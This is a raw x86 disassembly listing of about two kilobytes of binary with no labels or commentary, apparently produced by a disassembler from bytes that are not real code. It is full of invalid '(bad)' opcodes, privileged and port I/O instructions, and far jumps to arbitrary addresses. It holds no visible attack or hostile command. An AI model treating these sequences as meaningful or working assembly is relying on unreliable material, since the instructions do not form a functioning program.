  4158eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ec:	aam    0x77
  4158ee:	sahf   
  4158ef:	inc    esi
  4158f0:	(bad)  
  4158f1:	hlt    
  4158f2:	jle    0x4158ea
  4158f4:	(bad)  [edi-0x57986d46]
  4158fa:	in     eax,dx
  4158fb:	pop    es
  4158fc:	aad    0x75
  4158fe:	out    dx,eax
  4158ff:	mov    DWORD PTR [edi],edx
  415901:	into   
  415902:	icebp  
  415903:	test   eax,ebx
  415905:	xchg   ebx,eax
  415906:	int    0x38
  415908:	xor    al,0x24
  41590a:	inc    eax
  41590b:	out    dx,eax
  41590c:	xchg   esi,eax
  41590d:	stos   DWORD PTR es:[edi],eax
  41590e:	sbb    esp,edi
  415910:	cdq    
  415911:	inc    ebx
  415912:	push   0xb1021154
  415917:	das    
  415918:	mov    eax,0xe17669a2
  41591d:	push   ss
  41591e:	dec    ecx
  41591f:	sbb    ebp,DWORD PTR [edx-0x15]
  415922:	aaa    
  415923:	loop   0x4158c5
  415925:	in     eax,0x26
  415927:	mov    esp,0x2869961a
  41592c:	mov    bh,0xa0
  41592e:	sub    cl,al
  415930:	cmp    cl,BYTE PTR [ebx+0x45dc6d96]
  415936:	or     eax,0x36bcb3bb
  41593b:	hlt    
  41593c:	hlt    
  41593d:	(bad)  
  41593e:	call   0xeaa6e0d6
  415943:	sbb    BYTE PTR [ebx-0x6223c689],cl
  415949:	sbb    ecx,esi
  41594b:	ror    DWORD PTR [esi-0x2b026a26],1
  415951:	pop    eax
  415952:	std    
  415953:	int3   
  415954:	stc    
  415955:	or     eax,0x51d91a7
  41595a:	ins    BYTE PTR es:[edi],dx
  41595b:	ja     0x4159cc
  41595d:	loope  0x4159b9
  41595f:	sbb    eax,0x4a387c31
  415964:	add    DWORD PTR [edx],edx
  415966:	xor    DWORD PTR [edi+ebx*4+0x6f1a61b4],esi
  41596d:	call   0x955b:0x4fb68a74
  415974:	outs   dx,BYTE PTR ds:[esi]
  415975:	lock shl DWORD PTR [edi-0x39],0xda
  41597a:	scas   al,BYTE PTR es:[edi]
  41597b:	mov    esp,0x102ad562
  415980:	fistp  DWORD PTR [esi]
  415982:	jge    0x41598c
  415984:	imul   eax,ebp,0xfffffffa
  415987:	cmp    BYTE PTR ds:0xd6f69e80,0x5e
  41598e:	or     DWORD PTR [eax+0x2718ac20],ebx
  415994:	mov    ebp,DWORD PTR [ecx-0x5474857b]
  41599a:	je     0x4159d3
  41599c:	inc    edi
  41599d:	xchg   ebx,eax
  41599e:	loop   0x415980
  4159a0:	mov    ds:0x577d95b9,al
  4159a5:	ds cmp al,0xfc
  4159a8:	xor    eax,0xc1520af0
  4159ad:	inc    ebp
  4159ae:	imul   ebx,DWORD PTR [ecx+0x6a],0xae1bfbe4
  4159b5:	iret   
  4159b6:	xor    al,0x12
  4159b8:	ror    ebp,cl
  4159ba:	popf   
  4159bb:	call   0x3652:0x88f46549
  4159c2:	xchg   ecx,ecx
  4159c4:	jo     0x4159bb
  4159c6:	retf   0xd67f
  4159c9:	dec    ecx
  4159ca:	test   eax,0xded8795
  4159cf:	outs   dx,DWORD PTR ds:[esi]
  4159d0:	jo     0x4159bb
  4159d2:	adc    ebp,edi
  4159d4:	aam    0x2e
  4159d6:	jbe    0x415a2a
  4159d8:	jae    0x415995
  4159da:	repz jle 0x41596e
  4159dd:	repnz out 0x4,eax
  4159e0:	push   edx
  4159e1:	shl    esi,0xd1
  4159e4:	pusha  
  4159e5:	sub    eax,esp
  4159e7:	ins    DWORD PTR es:[edi],dx
  4159e8:	pusha  
  4159e9:	jbe    0x415a45
  4159eb:	push   ss
  4159ec:	and    edi,DWORD PTR [edx-0x29]
  4159ef:	dec    esp
  4159f0:	add    eax,0xb790b007
  4159f5:	jno    0x415a4d
  4159f7:	je     0x4159e8
  4159f9:	call   0x5968223d
  4159fe:	(bad)  
  4159ff:	fwait
  415a00:	adc    bh,dl
  415a02:	mov    bh,0x40
  415a04:	xchg   esi,eax
  415a05:	imul   ebx,DWORD PTR [esi-0x6b],0xffffffa8
  415a09:	stos   DWORD PTR es:[edi],eax
  415a0a:	shl    DWORD PTR [edx+eax*4-0x58f9a6ab],0x9d
  415a12:	mov    cl,0x39
  415a14:	das    
  415a15:	loope  0x4159ff
  415a17:	ins    BYTE PTR es:[edi],dx
  415a18:	inc    esi
  415a19:	stc    
  415a1a:	jge    0x415a57
  415a1c:	repz dec ecx
  415a1e:	pop    ebx
  415a1f:	push   0xc6ce52ab
  415a24:	outs   dx,DWORD PTR ds:[esi]
  415a25:	stos   DWORD PTR es:[edi],eax
  415a26:	prefetch BYTE PTR [edx-0x3e]
  415a2a:	icebp  
  415a2b:	pop    ecx
  415a2c:	outs   dx,BYTE PTR ds:[si]
  415a2e:	stc    
  415a2f:	es dec eax
  415a31:	xchg   DWORD PTR [ebx+0xf],edx
  415a34:	mov    esi,0x36eab4fb
  415a39:	and    al,0x6d
  415a3b:	or     DWORD PTR [eax],0x2b6d0e54
  415a41:	mov    bl,0x8f
  415a43:	push   es
  415a44:	lahf   
  415a45:	pop    esi
  415a46:	stos   BYTE PTR es:[edi],al
  415a47:	and    eax,0xbce830fe
  415a4c:	sub    al,0x2f
  415a4e:	push   edi
  415a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a50:	mov    ecx,0x3699ce4
  415a55:	aas    
  415a56:	or     eax,0x92691eb8
  415a5b:	xchg   al,al
  415a5d:	gs idiv bl
  415a60:	jmp    0xb74c19f0
  415a65:	sub    DWORD PTR [eax-0x22],0xffffffe1
  415a69:	fldcw  WORD PTR [ebx+0x15c09ff]
  415a6f:	gs dec edx
  415a71:	add    bh,al
  415a73:	lock test BYTE PTR [ebp-0x18],bh
  415a77:	adc    eax,0xa0addab1
  415a7c:	clc    
  415a7d:	imul   esi,ebp,0xfffffff7
  415a80:	adc    DWORD PTR [edi-0xe],0x8c3468c2
  415a87:	jae    0x415a92
  415a89:	mov    ecx,gs
  415a8b:	out    0xd7,eax
  415a8d:	(bad)  
  415a8e:	ja     0x415abb
  415a90:	mov    dh,0x0
  415a92:	sbb    al,BYTE PTR [ebp-0x45]
  415a95:	pop    ebp
  415a96:	mov    ds:0x75285f7b,eax
  415a9b:	div    cl
  415a9d:	(bad)  [ebx-0x4d8f8e69]
  415aa3:	dec    eax
  415aa4:	inc    ecx
  415aa5:	dec    ebp
  415aa6:	rol    ecx,cl
  415aa8:	mov    BYTE PTR [edx-0x6fd3fc10],bh
  415aae:	pop    ebp
  415aaf:	cmp    eax,0xa4462eed
  415ab4:	(bad)  
  415ab5:	mov    BYTE PTR [eax-0x61],bh
  415ab8:	mov    ebp,0x39bf6e41
  415abd:	lods   al,BYTE PTR ds:[esi]
  415abe:	sbb    edx,DWORD PTR [esp+edi*8]
  415ac1:	daa    
  415ac2:	push   ebx
  415ac3:	xchg   edi,eax
  415ac4:	lds    ecx,FWORD PTR [eax]
  415ac6:	leave  
  415ac7:	ret    
  415ac8:	mov    ebx,0x106e430
  415acd:	(bad)  
  415ace:	push   edx
  415acf:	pop    ebp
  415ad0:	test   DWORD PTR [edx],ecx
  415ad2:	xchg   ebx,eax
  415ad3:	int3   
  415ad4:	adc    al,BYTE PTR [esp+ecx*2]
  415ad7:	mov    esi,0x863c9b3
  415adc:	(bad)  
  415add:	fdivr  st,st(1)
  415adf:	mov    ds:0xe7c796d8,eax
  415ae4:	in     eax,0xf1
  415ae6:	int    0x68
  415ae8:	xor    al,0x83
  415aea:	imul   ecx,DWORD PTR [edi],0x79
  415aed:	mov    esi,0xb4a19840
  415af2:	mov    ch,0x95
  415af4:	pop    edx
  415af5:	lods   eax,DWORD PTR ds:[esi]
  415af6:	mov    eax,ds:0x79e1cdb9
  415afb:	inc    ebx
  415afc:	jbe    0x415b5e
  415afe:	aaa    
  415aff:	mov    ecx,0x3daf2bef
  415b04:	xchg   edx,eax
  415b05:	ret    
  415b06:	ja     0x415adb
  415b08:	xchg   ebx,eax
  415b09:	push   edx
  415b0a:	or     ebx,DWORD PTR [ebx+eax*2]
  415b0d:	pushf  
  415b0e:	jmp    FWORD PTR [ebp+0x25]
  415b11:	mov    fs,edi
  415b13:	cdq    
  415b14:	scas   al,BYTE PTR es:[edi]
  415b15:	push   ss
  415b16:	xor    dh,BYTE PTR [esi+0xa]
  415b19:	aad    0x47
  415b1b:	push   ebp
  415b1c:	fwait
  415b1d:	outs   dx,DWORD PTR ds:[esi]
  415b1e:	fninit 
  415b20:	push   es
  415b21:	xchg   esp,eax
  415b22:	imul   ebp,eax,0x2e
  415b25:	xor    eax,0x70ac9503
  415b2a:	or     DWORD PTR [edx+eiz*8-0x3],edi
  415b2e:	and    eax,0x29af21af
  415b33:	outs   dx,DWORD PTR ds:[esi]
  415b34:	xchg   ecx,eax
  415b35:	add    BYTE PTR [edi-0x4e],dh
  415b38:	xchg   esi,eax
  415b39:	jne    0x415b3e
  415b3b:	data16 idiv WORD PTR [esi+0x30]
  415b40:	dec    edi
  415b41:	sbb    DWORD PTR [eax],edi
  415b43:	fisttp WORD PTR [edx]
  415b45:	stc    
  415b46:	lock sbb ebx,DWORD PTR [ecx-0x6a]
  415b4a:	rol    DWORD PTR [edx],1
  415b4c:	call   0x3955:0xbb6b38c4
  415b53:	push   ebp
  415b54:	fistp  DWORD PTR [ebx+ecx*1]
  415b57:	inc    edi
  415b58:	(bad)  
  415b59:	inc    DWORD PTR [ecx-0x1fa50415]
  415b5f:	adc    DWORD PTR [edx],edi
  415b61:	sbb    esp,DWORD PTR [esi+eax*4+0x4ad5684e]
  415b68:	inc    esp
  415b69:	fstp   DWORD PTR [ebp+0x24d2cebd]
  415b6f:	lods   eax,DWORD PTR ds:[esi]
  415b70:	ss pop eax
  415b72:	mov    DWORD PTR [ecx+ebx*8-0x3beb50c],esp
  415b79:	cdq    
  415b7a:	pop    edi
  415b7b:	out    dx,al
  415b7c:	mov    al,ds:0xafa41e50
  415b81:	aam    0x27
  415b83:	inc    esi
  415b84:	pop    edi
  415b85:	mov    DWORD PTR [edx],0xe16b2549
  415b8b:	loop   0x415b9c
  415b8d:	or     eax,0x35ad1395
  415b92:	mov    dh,0x7
  415b94:	cwde   
  415b95:	in     eax,0xdb
  415b97:	call   0xc341ca9c
  415b9c:	cwde   
  415b9d:	mov    ds:0xda42fbc5,eax
  415ba2:	jns    0x415bbc
  415ba4:	cmp    BYTE PTR [ecx-0x29],ah
  415ba7:	push   cs
  415ba8:	pop    ebp
  415ba9:	mov    ecx,0x4304b777
  415bae:	jae    0x415c20
  415bb0:	or     edx,DWORD PTR [edx*4+0x190c28bd]
  415bb7:	dec    ebx
  415bb8:	scas   al,BYTE PTR es:[edi]
  415bb9:	sbb    eax,0xa87a455f
  415bbe:	mov    eax,0xc2892704
  415bc3:	jne    0x415ba4
  415bc5:	mov    bh,0x4b
  415bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bc8:	mov    esi,0xc0c2e1a5
  415bcd:	or     BYTE PTR [ebx+edi*2+0x6fe91f0c],bh
  415bd4:	sbb    BYTE PTR [eax],cl
  415bd6:	mov    WORD PTR [esi+0x1e],es
  415bd9:	xor    DWORD PTR [ecx+0x42a7bfdd],ebp
  415bdf:	scas   eax,DWORD PTR es:[edi]
  415be0:	xchg   edx,eax
  415be1:	arpl   WORD PTR [esi+0xcba0e78],bx
  415be7:	daa    
  415be8:	jo     0x415bc4
  415bea:	lock xor BYTE PTR [ebx+0x23204237],dl
  415bf1:	icebp  
  415bf2:	sbb    BYTE PTR [edi+0x291f5588],0xea
  415bf9:	test   al,0x68
  415bfb:	push   esp
  415bfc:	push   0xffffffb6
  415bfe:	xchg   esp,eax
  415bff:	or     eax,0x498a43ff
  415c04:	fdiv   QWORD PTR [ecx+0x10168f80]
  415c0a:	push   0xffffff95
  415c0c:	pushf  
  415c0d:	cmp    al,0xf1
  415c0f:	push   esp
  415c10:	dec    ebp
  415c11:	outs   dx,BYTE PTR ds:[esi]
  415c12:	inc    edi
  415c13:	ja     0x415c3f
  415c15:	(bad)  
  415c16:	in     al,0x39
  415c18:	retf   0x9200
  415c1b:	scas   eax,DWORD PTR es:[edi]
  415c1c:	jo     0x415c09
  415c1e:	repnz xchg ecx,eax
  415c20:	test   BYTE PTR [ecx],dl
  415c22:	and    DWORD PTR [ecx-0x1c1e397d],0x126dabf1
  415c2c:	add    DWORD PTR [esi-0x1f],0xffffffc8
  415c30:	push   edx
  415c31:	mov    bl,0x98
  415c33:	mov    ah,0x75
  415c35:	adc    esp,ecx
  415c37:	mov    bl,0x3
  415c39:	not    BYTE PTR [eax+edi*8]
  415c3c:	ret    0x63d4
  415c3f:	imul   edi,DWORD PTR [ebx-0x42],0xffffffd8
  415c43:	jbe    0x415bd0
  415c45:	adc    DWORD PTR [edi],esi
  415c47:	mov    ebp,0xfba86ec
  415c4c:	and    BYTE PTR [ecx+0x7e],ch
  415c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c50:	pop    edi
  415c51:	ret    0x381b
  415c54:	in     al,dx
  415c55:	push   edi
  415c56:	jecxz  0x415c63
  415c58:	popa   
  415c59:	inc    eax
  415c5a:	ret    
  415c5b:	loopne 0x415c41
  415c5d:	mov    dh,0xae
  415c5f:	pop    eax
  415c60:	jl     0x415c2d
  415c62:	cmc    
  415c63:	(bad)  
  415c64:	(bad)
  415c67:	mov    ds:0xd081280f,eax
  415c6c:	adc    BYTE PTR ss:[eax],al
  415c6f:	lock dec esp
  415c71:	fcomi  st,st(3)
  415c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c74:	jl     0x415c33
  415c76:	xchg   esi,eax
  415c77:	loope  0x415ca1
  415c79:	out    dx,eax
  415c7a:	mov    al,ds:0x8f3768db
  415c7f:	mov    ah,0x75
  415c81:	icebp  
  415c82:	scas   al,BYTE PTR es:[edi]
  415c83:	ss loopne 0x415c26
  415c86:	adc    eax,0x5173c645
  415c8b:	jp     0x415c56
  415c8d:	(bad)  
  415c8e:	jmp    0xc196:0x7b86cbc1
  415c95:	jmp    0x844d4ff6
	...
  415d12:	add    BYTE PTR [eax],al
  415d14:	push   ebp
  415d15:	xlat   BYTE PTR ds:[ebx]
  415d16:	mov    edx,0x7defba87
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	lea    esp,[esi+edx*4+0x6a]
  415d20:	pop    DWORD PTR [eax+0x23b1367]
  415d26:	add    DWORD PTR [eax],eax
  415d28:	outs   dx,BYTE PTR ds:[esi]
  415d29:	pop    es
  415d2a:	add    BYTE PTR [eax],al
  415d2c:	sbb    DWORD PTR [edx+ebx*8+0x34e7299b],0x19
  415d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d35:	and    DWORD PTR [ebp+0x1e28bba4],edi
  415d3b:	sub    al,0x19
  415d3d:	out    dx,eax
  415d3e:	or     bl,dl
  415d40:	(bad)  
  415d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d42:	retf   0x472d
  415d45:	mov    dh,0xf4
  415d47:	xor    al,0x3
  415d49:	je     0x415daa
  415d4b:	jge    0x415d10
  415d4d:	sbb    al,0x4
  415d4f:	cmc    
  415d50:	pop    ebp
  415d51:	sbb    ebx,DWORD PTR [edi-0x6aa15904]
  415d57:	add    eax,DWORD PTR [edi]
  415d59:	arpl   WORD PTR [edi-0x1a],bp
  415d5c:	and    al,0xb7
  415d5e:	sar    BYTE PTR [edi-0x7d],cl
  415d61:	jmp    0x7cafb3b
  415d66:	fwait
  415d67:	cmc    
  415d68:	mov    eax,0x4b2b0732
  415d6d:	psllq  mm2,mm0
  415d70:	jmp    0x6ae2ba0b
  415d75:	add    DWORD PTR [ebx+0x3d],ebp
  415d78:	pop    ebp
  415d79:	jns    0x415dcd
  415d7b:	jg     0x415dcc
  415d7d:	inc    ebx
  415d7e:	(bad)  
  415d7f:	mov    dx,0xe9b1
  415d83:	dec    esi
  415d84:	sub    bl,bh
  415d86:	data16 int 0xe6
  415d89:	(bad)  
  415d8b:	pusha  
  415d8c:	lss    ebp,FWORD PTR ds:0x7e8fd6e7
  415d93:	iret   
  415d94:	aaa    
  415d95:	pushf  
  415d96:	lods   al,BYTE PTR ds:[esi]
  415d97:	rcl    BYTE PTR [esi+0x47],1
  415d9a:	ins    BYTE PTR es:[edi],dx
  415d9b:	in     al,0x8e
  415d9d:	push   edi
  415d9e:	inc    esi
  415d9f:	adc    eax,0x4bcd3a90
  415da4:	push   0xa61b17f8
  415da9:	fstp   QWORD PTR [ecx-0x774cf89e]
  415daf:	xor    DWORD PTR [ecx+0x5],ebx
  415db2:	cld    
  415db3:	add    BYTE PTR [ebx+0x40a20d30],bl
  415db9:	xor    ch,cl
  415dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dbc:	push   ebx
  415dbd:	xchg   ecx,eax
  415dbe:	popf   
  415dbf:	jge    0x415e20
  415dc1:	xchg   DWORD PTR [edx],esp
  415dc3:	add    edx,DWORD PTR [esi+0x2335e8ab]
  415dc9:	xlat   BYTE PTR ds:[ebx]
  415dca:	dec    edx
  415dcb:	pop    esi
  415dcc:	(bad)  
  415dcd:	mul    BYTE PTR [esi+0x729cba61]
  415dd3:	test   edi,0xbba5d7ba
  415dd9:	data16 fdivr DWORD PTR [ecx+0x32d6712b]
  415de0:	fimul  WORD PTR [edx+0x2f]
  415de3:	adc    al,0xa5
  415de5:	cmc    
  415de6:	enter  0x7efd,0x7d
  415dea:	pushf  
  415deb:	fwait
  415dec:	retf   0x875f
  415def:	ret    
  415df0:	dec    ebp
  415df1:	jl     0x415dcf
  415df3:	push   edi
  415df4:	(bad)  
  415df5:	or     eax,0x15b9f1d
  415dfa:	mov    al,ds:0xae2b7587
  415dff:	dec    esp
  415e00:	push   ebx
  415e01:	mov    dl,0x86
  415e03:	sbb    BYTE PTR [ecx],dl
  415e05:	jb     0x415d9e
  415e07:	push   eax
  415e08:	mov    ebp,0xeeae3f27
  415e0d:	in     al,0xb3
  415e0f:	pop    esi
  415e10:	sub    eax,0xd5e42d4f
  415e15:	cmp    DWORD PTR [edi+0x2],ebx
  415e18:	sti    
  415e19:	in     al,dx
  415e1a:	(bad)  
  415e1b:	in     eax,0xf5
  415e1d:	retf   
  415e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e1f:	pop    edi
  415e20:	mov    ecx,0x3abe1c98
  415e25:	xchg   eax,edi
  415e27:	es in  al,dx
  415e29:	mov    ds:0xdaad3c22,eax
  415e2e:	test   BYTE PTR [ebx+edi*2+0x4f2a9e40],al
  415e35:	push   ss
  415e36:	mov    ah,0xd
  415e38:	imul   esi,ecx,0x1201a19d
  415e3e:	cmp    eax,0xed5b2767
  415e43:	les    edi,FWORD PTR [edx-0x5b3e4542]
  415e49:	leave  
  415e4a:	lea    ebp,[ecx]
  415e4c:	jbe    0x415e8b
  415e4e:	neg    DWORD PTR [edx-0x29]
  415e51:	mov    dh,0xf1
  415e53:	or     esp,DWORD PTR [edx+0x3b29c1d8]
  415e59:	int    0xed
  415e5b:	aaa    
  415e5c:	retf   0x9745
  415e5f:	cld    
  415e60:	lods   al,BYTE PTR ds:[esi]
  415e61:	lock cdq 
  415e63:	(bad)  
  415e65:	jle    0x415ec4
  415e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e68:	icebp  
  415e69:	repz add eax,DWORD PTR [ebx]
  415e6c:	mov    DWORD PTR ds:0xc789ca95,ebp
  415e72:	jge    0x415ebc
  415e74:	pusha  
  415e75:	push   ebp
  415e76:	jge    0x415e41
  415e78:	je     0x415eb3
  415e7a:	stos   DWORD PTR es:[edi],eax
  415e7b:	inc    DWORD PTR [edi]
  415e7d:	xor    BYTE PTR [ecx+0x32],0x7b
  415e81:	mov    ecx,0x669ee8f6
  415e86:	cmp    ecx,esi
  415e88:	(bad)  
  415e8a:	out    dx,al
  415e8b:	add    ch,dh
  415e8d:	and    al,0x88
  415e8f:	in     eax,dx
  415e90:	stos   DWORD PTR es:[edi],eax
  415e91:	ins    BYTE PTR es:[edi],dx
  415e92:	lds    edx,FWORD PTR [edx-0x4e]
  415e95:	xchg   edx,eax
  415e96:	cdq    
  415e97:	stos   DWORD PTR es:[edi],eax
  415e98:	rcl    DWORD PTR [edx],cl
  415e9a:	mov    bh,0xf3
  415e9c:	jmp    0xffed:0xac45c980
  415ea3:	xchg   BYTE PTR [esi],ch
  415ea5:	test   eax,0xb66e7a9
  415eaa:	add    esi,esi
  415eac:	int    0x67
  415eae:	xchg   DWORD PTR [edi-0x2],edx
  415eb1:	retf   
  415eb2:	sar    DWORD PTR [esi],1
  415eb4:	mov    fs,WORD PTR [ebx+0x11e01e1a]
  415eba:	sar    DWORD PTR [ebp-0x6],0xe7
  415ebe:	not    BYTE PTR [edi+0x43]
  415ec1:	mov    dh,0x80
  415ec3:	shl    dh,1
  415ec5:	in     al,0x13
  415ec7:	pop    ds
  415ec8:	or     al,0xa
  415eca:	loope  0x415eca
  415ecc:	les    ebp,FWORD PTR [edi-0x36f566fb]
  415ed2:	and    al,0xce
  415ed4:	pop    eax
  415ed5:	ror    DWORD PTR [esi-0x76],1
  415ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed9:	aas    
  415eda:	inc    ebp
  415edb:	pop    ebx
  415edc:	add    DWORD PTR [ebx+0x7a2cd27a],0xcb469d7
  415ee6:	(bad)  
  415ee7:	imul   eax,DWORD PTR [ecx-0x6a],0xffffffe8
  415eeb:	pop    eax
  415eec:	retf   0xd6c5
  415eef:	and    edi,DWORD PTR [ecx+ebp*2-0x4a]
  415ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ef4:	loopne 0x415f45
  415ef6:	jnp    0x415ea6
  415ef8:	inc    ebp
  415ef9:	jo     0x415ef0
  415efb:	ins    BYTE PTR es:[edi],dx
  415efc:	mov    bl,0xd
  415efe:	arpl   WORD PTR [edi+edi*1-0x1f],sp
  415f02:	das    
  415f03:	ret    
  415f04:	push   edx
  415f05:	jmp    0xd5e6:0x44eeb098
  415f0c:	sbb    ch,BYTE PTR [ecx-0x57]
  415f0f:	ret    
  415f10:	out    dx,al
  415f11:	jg     0x415f80
  415f13:	jge    0x415f40
  415f15:	sar    BYTE PTR [edx+edx*1-0x41],cl
  415f19:	pop    es
  415f1a:	lea    edi,[ecx-0x5c9b473]
  415f20:	or     eax,0x86fbbdc1
  415f25:	fwait
  415f26:	mov    BYTE PTR [ecx],ah
  415f28:	ret    
  415f29:	(bad)  [esi+0x78]
  415f2c:	and    ah,BYTE PTR [ebx-0x24]
  415f2f:	lahf   
  415f30:	aam    0xca
  415f32:	xchg   edx,eax
  415f33:	jne    0x415f47
  415f35:	jns    0x415f76
  415f37:	mov    ch,0x96
  415f39:	cld    
  415f3a:	pop    ebp
  415f3b:	pop    ds
  415f3c:	repz adc al,0x8d
  415f3f:	cmp    bh,ah
  415f41:	xor    al,0x38
  415f43:	aaa    
  415f44:	fldenv [ecx]
  415f46:	lods   eax,DWORD PTR ds:[esi]
  415f47:	pop    esp
  415f48:	pop    ss
  415f49:	pop    esp
  415f4a:	mov    esi,0xae963e91
  415f4f:	mov    edx,edx
  415f51:	mov    bl,0xf0
  415f53:	cmp    esp,DWORD PTR [esi+0x4b]
  415f56:	call   0x2f1b231b
  415f5b:	pop    ds
  415f5c:	pop    esp
  415f5d:	fstp   DWORD PTR [esi]
  415f5f:	arpl   WORD PTR [ecx+esi*1+0x5b],bx
  415f63:	add    BYTE PTR ds:0x2c88a2e9,dh
  415f69:	(bad)  [di+0x7219]
  415f6e:	mov    DWORD PTR [ecx+0x12c9a905],ebp
  415f74:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  415f76:	push   ds
  415f77:	inc    esp
  415f78:	(bad)  
  415f79:	loope  0x415fe2
  415f7b:	push   ecx
  415f7c:	mov    cl,0x40
  415f7e:	(bad)  
  415f7f:	imul   esi,DWORD PTR [esi+0x59be1e52],0xffffffbb
  415f86:	cld    
  415f87:	into   
  415f88:	ds scas al,BYTE PTR es:[edi]
  415f8a:	hlt    
  415f8b:	jl     0x415f77
  415f8d:	push   ebp
  415f8e:	mov    eax,ds:0x23e08e51
  415f93:	xchg   edx,eax
  415f94:	push   ds
  415f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f96:	(bad)  
  415f98:	pop    ds
  415f99:	push   ecx
  415f9a:	add    BYTE PTR [ebx+0xcbb5e40],0x25
  415fa1:	or     al,0xc6
  415fa3:	mov    edi,0x5565f9c3
  415fa8:	sbb    DWORD PTR fs:[edx+0x4c],ebx
  415fac:	cdq    
  415fad:	dec    ebx
  415fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415faf:	add    eax,0x5b2f404a
  415fb4:	push   cs
  415fb5:	daa    
  415fb6:	stc    
  415fb7:	push   es
  415fb8:	out    0x2a,al
  415fba:	arpl   WORD PTR [ebx],bx
  415fbc:	mov    ecx,0x88c83eb5
  415fc1:	add    al,0xfd
  415fc3:	and    eax,0xe22ecfde
  415fc8:	mov    bl,0x2a
  415fca:	sub    al,0xdd
  415fcc:	and    eax,0x677e6965
  415fd1:	loop   0x415f7d
  415fd3:	in     eax,0x9c
  415fd5:	cdq    
  415fd6:	jo     0x415f6b
  415fd8:	inc    ebx
  415fd9:	mov    WORD PTR [eax+ebp*1-0x4f43576e],?
  415fe0:	jp     0x415f79
  415fe2:	add    ch,dh
  415fe4:	ds push esp
  415fe6:	or     DWORD PTR [ebx+0x7ed5c565],esp
  415fec:	cmp    BYTE PTR es:[ebx+0x66],dh
  415ff0:	jae    0x415fc6
  415ff2:	add    al,0x56
  415ff4:	or     ebp,eax
  415ff6:	xor    edi,ebx
  415ff8:	inc    ebx
  415ff9:	addr16 in al,0x9a
  415ffc:	cwde   
  415ffd:	push   0xf9ece18
  416002:	dec    esp
  416003:	or     bl,BYTE PTR [eax+0x79]
  416006:	add    eax,0x3a6e6faa
  41600b:	dec    eax
  41600c:	int3   
  41600d:	and    al,0x2e
  41600f:	fisttp WORD PTR [edx+0x2f482ce5]
  416015:	cmc    
  416016:	adc    bh,al
  416018:	push   ecx
  416019:	xor    DWORD PTR ss:[ebp+0x4d],edi
  41601d:	shl    bl,1
  41601f:	(bad)  [edx-0x77435a6e]
  416025:	xchg   ebp,eax
  416026:	scas   al,BYTE PTR es:[edi]
  416027:	inc    ecx
  416028:	(bad)  
  416029:	das    
  41602a:	cli    
  41602b:	pushf  
  41602c:	cmp    DWORD PTR [edi+0x6b],edx
  41602f:	enter  0xcac5,0x17
  416033:	inc    edx
  416034:	inc    eax
  416035:	ret    
  416036:	inc    esp
  416037:	mov    edx,0x8357bb9d
  41603c:	ins    BYTE PTR es:[edi],dx
  41603d:	lock push 0xffffffd0
  416040:	(bad)  
  416041:	test   al,0x27
  416043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416044:	and    bl,cl
  416046:	das    
  416047:	popa   
  416048:	sub    ebx,DWORD PTR [eax]
  41604a:	add    eax,DWORD PTR [ecx+ecx*4]
  41604d:	adc    DWORD PTR ds:0xb5a42741,0xffffffc4
  416054:	jnp    0x416079
  416056:	mov    esp,0x8d4a3624
  41605b:	aaa    
  41605c:	adc    cl,al
  41605e:	dec    esp
  41605f:	and    edi,DWORD PTR [ebx-0x2d]
  416062:	or     bh,BYTE PTR [ecx]
  416064:	cli    
  416065:	mov    al,ds:0x3eb06b17
  41606a:	mov    bh,0xaa
  41606c:	xor    ah,dl
  41606e:	lods   al,BYTE PTR ds:[esi]
  41606f:	lea    eax,[esi]
  416071:	std    
  416072:	push   esp
  416073:	ds addr16 xchg edx,eax
  416076:	dec    esi
  416077:	dec    ebp
  416078:	inc    esi
  416079:	jmp    0x416070
  41607b:	push   esi
  41607c:	jmp    0x50faac60
  416081:	inc    edi
  416082:	(bad)  
  416083:	std    
  416084:	or     cl,BYTE PTR [ebx+edx*8-0xd6e5b2a]
  41608b:	and    ecx,edi
  41608d:	pop    esp
  41608e:	mov    edx,0xc8495f02
  416093:	cmp    ch,BYTE PTR ds:0x5a588145
  416099:	(bad)  
  41609a:	jp     0x41607b
  41609c:	in     eax,dx
  41609d:	inc    edi
  41609e:	fidiv  DWORD PTR [ecx+0xe]
  4160a1:	retf   
  4160a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a3:	inc    edx
  4160a4:	fst    QWORD PTR [eax]
  4160a6:	daa    
  4160a7:	xchg   BYTE PTR [eax+ebx*8+0x47748d8e],dh
  4160ae:	sahf   
  4160af:	xchg   edi,eax
  4160b0:	repz cmp al,0xe2
  4160b3:	mov    esi,0x9b3045dd
  4160b8:	mov    fs,WORD PTR [eax]
  4160ba:	xchg   ebp,eax
  4160bb:	iret   
  4160bc:	rcr    DWORD PTR [edi],0xfb
  4160bf:	dec    esp
  4160c0:	add    BYTE PTR [edx+0x4e],bl
  4160c3:	jmp    0x6128:0x10535e5e
  4160ca:	sahf   
  4160cb:	pop    esp
  4160cc:	adc    bh,BYTE PTR [ebx-0x1f]
  4160cf:	lock pop ebx
  4160d1:	fld    QWORD PTR [ebx+edi*4+0x6d94c92e]
  4160d8:	ret    0x272d
  4160db:	mov    ah,0xf7
  4160dd:	inc    ebx
  4160de:	std    
  4160df:	repz mov bh,0xc5
  4160e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e3:	fsub   st,st(0)
  4160e5:	mov    ebx,DWORD PTR [esi+esi*4]
  4160e8:	xchg   DWORD PTR [ebp+0x27],ebp
  4160eb:	fiadd  DWORD PTR [esi+esi*1]
